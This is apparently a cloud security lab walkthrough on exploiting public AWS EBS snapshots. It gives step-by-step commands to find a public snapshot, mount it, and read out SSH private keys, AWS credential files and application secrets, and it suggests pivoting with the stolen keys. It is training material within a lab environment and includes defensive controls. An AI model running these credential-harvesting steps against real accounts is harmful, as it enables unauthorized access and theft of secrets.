# EBS Snapshot Exploitation Lab

**Difficulty:** 4  
**Estimated Time:** 45-60 minutes  
**Prerequisites:** AWS CLI, basic Linux administration, understanding of EBS volumes

## Scenario

During a security audit, you've been given IAM credentials for a limited analyst account. Your task is to enumerate publicly accessible resources and assess the risk of data exposure. Intelligence suggests that a production server was recently decommissioned, and its backup snapshot may contain sensitive information.

The target organization failed to follow proper credential rotation procedures after creating their final backup snapshot. Your objective is to discover this snapshot, create a volume from it, mount it to your existing infrastructure, and extract any sensitive data.

## Learning Objectives

- Enumerate EBS snapshots across AWS accounts
- Identify publicly accessible snapshots
- Create and attach EBS volumes from snapshots
- Mount and analyze filesystem contents from recovered volumes
- Extract credentials and secrets from backup data
- Understand the security implications of public snapshot exposure

## Architecture

- IAM user with minimal EC2 permissions (snapshot enumeration, volume operations)
- Publicly accessible EBS snapshot containing decommissioned server data
- Sensitive data embedded in filesystem: SSH keys, database credentials, API keys, application secrets

## Attack Chain

1. **IAM Enumeration** → Understand available permissions
2. **Snapshot Discovery** → Find publicly accessible EBS snapshots
3. **Volume Creation** → Create volume from exposed snapshot in your availability zone
4. **Volume Attachment** → Attach volume to your Kali instance
5. **Filesystem Analysis** → Mount volume and explore filesystem
6. **Data Extraction** → Locate and extract sensitive credentials
7. **Impact Assessment** → Document findings and potential impact

## Initial Setup

Deploy the lab and retrieve analyst credentials:

```bash
vault deploy aws/ebs-snapshot-exposure
vault outputs aws/ebs-snapshot-exposure

# Get the secret access key
terraform output -raw analyst_secret_access_key
```

Configure AWS CLI with analyst credentials:

```bash
aws configure set aws_access_key_id <access_key_id>
aws configure set aws_secret_access_key <secret_access_key>
aws configure set region us-gov-east-1
```

Verify access:

```bash
aws sts get-caller-identity
```

## Phase 1: IAM Enumeration

Understand what permissions the analyst account has:

```bash
# Attempt to list IAM permissions (will likely fail)
aws iam get-user

# Test EC2 permissions
aws ec2 describe-snapshots --max-results 5

# Check available regions
aws ec2 describe-regions
```

## Phase 2: Snapshot Discovery

Enumerate all snapshots accessible to your account:

```bash
# List all snapshots in the region
aws ec2 describe-snapshots --region us-gov-east-1

# Find public snapshots
aws ec2 describe-snapshots \
  --region us-gov-east-1 \
  --restorable-by-user-ids all

# Filter for specific account (use account ID from outputs)
aws ec2 describe-snapshots \
  --region us-gov-east-1 \
  --owner-ids <account_id>

# Look for snapshots with specific tags or descriptions
aws ec2 describe-snapshots \
  --region us-gov-east-1 \
  --filters "Name=description,Values=*backup*" \
  --restorable-by-user-ids all
```

**Key indicators of interesting snapshots:**
- Description mentioning "production", "backup", "decomm", or "final"
- Recent creation dates
- Tags indicating server names or purposes
- Public or shared permissions

## Phase 3: Volume Creation

Once you've identified the target snapshot, create a volume from it:

```bash
# Get your Kali instance availability zone
INSTANCE_ID=$(ec2-metadata --instance-id | cut -d ' ' -f 2)
AZ=$(aws ec2 describe-instances \
  --instance-ids $INSTANCE_ID \
  --query 'Reservations[0].Instances[0].Placement.AvailabilityZone' \
  --output text)

echo "Instance AZ: $AZ"

# Create volume from snapshot in the same AZ
SNAPSHOT_ID="<snapshot_id_from_enumeration>"
VOLUME_ID=$(aws ec2 create-volume \
  --snapshot-id $SNAPSHOT_ID \
  --availability-zone $AZ \
  --volume-type gp3 \
  --tag-specifications 'ResourceType=volume,Tags=[{Key=Name,Value=recovered-snapshot}]' \
  --query 'VolumeId' \
  --output text)

echo "Created volume: $VOLUME_ID"

# Wait for volume to be available
aws ec2 wait volume-available --volume-ids $VOLUME_ID
```

## Phase 4: Volume Attachment

Attach the volume to your Kali instance:

```bash
# Attach volume
aws ec2 attach-volume \
  --volume-id $VOLUME_ID \
  --instance-id $INSTANCE_ID \
  --device /dev/sdf

# Wait for attachment
aws ec2 wait volume-in-use --volume-ids $VOLUME_ID

# Verify attachment
lsblk
```

The volume should appear as a new block device (likely `/dev/xvdf` or `/dev/nvme1n1` depending on instance type).

## Phase 5: Filesystem Analysis

Mount the volume and explore its contents:

```bash
# Identify the device
lsblk
sudo fdisk -l

# Create mount point
sudo mkdir -p /mnt/recovered

# Mount the volume (adjust device name as needed)
sudo mount /dev/xvdf1 /mnt/recovered
# OR if it's NVMe:
# sudo mount /dev/nvme1n1p1 /mnt/recovered

# Verify mount
df -h | grep recovered
ls -la /mnt/recovered
```

## Phase 6: Data Extraction

Search for sensitive information across the filesystem:

```bash
# Check common credential locations
sudo ls -la /mnt/recovered/home/ec2-user/.ssh/
sudo ls -la /mnt/recovered/root/.aws/
sudo ls -la /mnt/recovered/opt/application/
sudo ls -la /mnt/recovered/var/www/

# Find environment files
sudo find /mnt/recovered -name ".env" -type f 2>/dev/null
sudo find /mnt/recovered -name "*secret*" -type f 2>/dev/null
sudo find /mnt/recovered -name "*credential*" -type f 2>/dev/null
sudo find /mnt/recovered -name "*.yml" -o -name "*.yaml" 2>/dev/null | grep -i config

# Search for SSH keys
sudo find /mnt/recovered -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null

# Search for AWS credentials
sudo find /mnt/recovered -path "*/.aws/*" 2>/dev/null

# Look for database configs
sudo find /mnt/recovered -name "database.yml" -o -name "db.conf" 2>/dev/null

# Search for docker-compose files (often contain credentials)
sudo find /mnt/recovered -name "docker-compose.yml" 2>/dev/null

# Search for Kubernetes secrets
sudo find /mnt/recovered -name "*secret*.yaml" 2>/dev/null
```

**Examine key files:**

```bash
# Application environment variables
sudo cat /mnt/recovered/var/www/app/.env

# Database configuration
sudo cat /mnt/recovered/opt/application/config/database.yml

# Application secrets
sudo cat /mnt/recovered/opt/application/config/secrets.json

# SSH private keys
sudo cat /mnt/recovered/home/ec2-user/.ssh/id_rsa

# AWS credentials
sudo cat /mnt/recovered/root/.aws/credentials

# README with additional context
sudo cat /mnt/recovered/home/ec2-user/README.txt
```

## Phase 7: Credential Analysis

Document all discovered credentials:

**SSH Keys:**
- Private keys for accessing other servers
- Authorized keys showing trust relationships

**Database Credentials:**
- Master database passwords
- Read-only user credentials
- Connection strings with embedded credentials

**API Keys:**
- Stripe payment processing keys
- SendGrid email service credentials
- Twilio SMS service tokens
- Datadog monitoring API keys

**AWS Credentials:**
- Access key IDs and secret keys
- IAM role information
- Multi-account configurations

**Application Secrets:**
- JWT signing secrets
- Encryption keys
- Session secrets
- Webhook signing secrets

## Cleanup

After extracting data, clean up resources:

```bash
# Unmount volume
sudo umount /mnt/recovered

# Detach volume
aws ec2 detach-volume --volume-id $VOLUME_ID

# Wait for detachment
aws ec2 wait volume-available --volume-ids $VOLUME_ID

# Delete volume
aws ec2 delete-volume --volume-id $VOLUME_ID

# Destroy lab
vault destroy aws/ebs-snapshot-exposure
```

## Key Concepts

### EBS Snapshots

EBS snapshots are point-in-time copies of EBS volumes stored in S3. They can be:
- **Private** (default): Only accessible to the creating account
- **Shared**: Accessible to specific AWS accounts
- **Public**: Accessible to all AWS accounts

### Snapshot Permissions

```bash
# Make snapshot public (dangerous!)
aws ec2 modify-snapshot-attribute \
  --snapshot-id snap-xxx \
  --create-volume-permission '{"Add":[{"Group":"all"}]}'

# Share with specific account
aws ec2 modify-snapshot-attribute \
  --snapshot-id snap-xxx \
  --create-volume-permission '{"Add":[{"UserId":"123456789012"}]}'
```

### Cross-Account Snapshot Access

When a snapshot is public or shared:
1. Any authorized AWS account can see it via `describe-snapshots --restorable-by-user-ids all`
2. They can create volumes from it in their own account
3. The snapshot data includes all filesystem contents at the time of creation

### Attack Surface

**Sensitive data commonly found in EBS snapshots:**
- SSH private keys in `/home/*/.ssh/` and `/root/.ssh/`
- Application configuration files with database credentials
- AWS credentials in `/root/.aws/` or environment files
- API keys and secrets in application directories
- Docker Compose files with environment variables
- Kubernetes secret manifests
- Log files potentially containing credentials
- Backup files and archives

## Defense and Mitigation

**Preventive Measures:**

1. **Never make production snapshots public**
   - Always audit snapshot permissions before creation
   - Use automation to prevent public snapshot creation

2. **Credential rotation after snapshot creation**
   - Rotate all credentials before creating snapshots for external sharing
   - Document which credentials exist in snapshots

3. **Encrypt EBS volumes**
   - Use AWS KMS encryption for all EBS volumes
   - Encrypted snapshots require key access to restore

4. **Automated snapshot scanning**
   - Implement tools to detect public snapshots
   - Alert on snapshot permission changes

5. **Least privilege IAM policies**
   - Restrict who can create public snapshots
   - Require approval workflows for snapshot sharing

**Detective Controls:**

```bash
# Find all public snapshots in account
aws ec2 describe-snapshots \
  --owner-ids self \
  --query 'Snapshots[?CreateVolumePermissions[?Group==`all`]]'

# Monitor CloudTrail for ModifySnapshotAttribute events
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=ModifySnapshotAttribute
```

**AWS Config Rules:**
- Enable `ebs-snapshot-public-restorable-check` rule
- Alert on any public snapshot creation

## Common Pitfalls

**Volume attachment errors:**
- Volume and instance must be in same availability zone
- Device names may differ (`/dev/sdf` vs `/dev/xvdf` vs `/dev/nvme1n1`)
- Check `dmesg` and `lsblk` to identify correct device

**Mounting failures:**
- Filesystem may be on a partition (`/dev/xvdf1` vs `/dev/xvdf`)
- May need to specify filesystem type: `mount -t ext4`
- Check for corruption with `fsck`

**Permission issues:**
- Mounted filesystems retain original permissions
- Need root/sudo to access most files
- SSH keys need correct permissions if extracting

## Real-World Impact

This scenario is based on real incidents:
- **2019**: Thousands of public EBS snapshots contained sensitive data including credentials
- **AWS Documentation**: Explicitly warns against making snapshots public
- **Data Exposure**: Once a snapshot is public, copies may exist in other accounts even after making it private

## Flag

Find the flag hidden in the application environment configuration file.

## Additional Challenges

**Advanced Exploitation:**

1. Use extracted SSH keys to access other infrastructure
2. Use extracted AWS credentials to enumerate additional resources
3. Use database credentials to query production databases
4. Chain multiple credentials to achieve deeper access

**Defensive Exercise:**

1. Write a script to audit all snapshots for public access
2. Create a Lambda function to automatically remediate public snapshots
3. Design an IAM policy preventing public snapshot creation
4. Build CloudWatch alerts for suspicious snapshot operations